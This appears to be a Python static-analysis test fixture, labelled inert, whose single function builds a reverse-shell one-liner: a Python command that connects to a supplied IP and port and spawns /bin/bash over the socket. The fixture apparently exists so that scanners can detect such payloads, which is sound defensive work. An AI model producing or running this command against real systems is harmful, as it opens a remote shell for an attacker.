# Inert static-analysis fixture. Do not execute.
def build(ip, port):
    return f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));pty.spawn("/bin/bash")\''
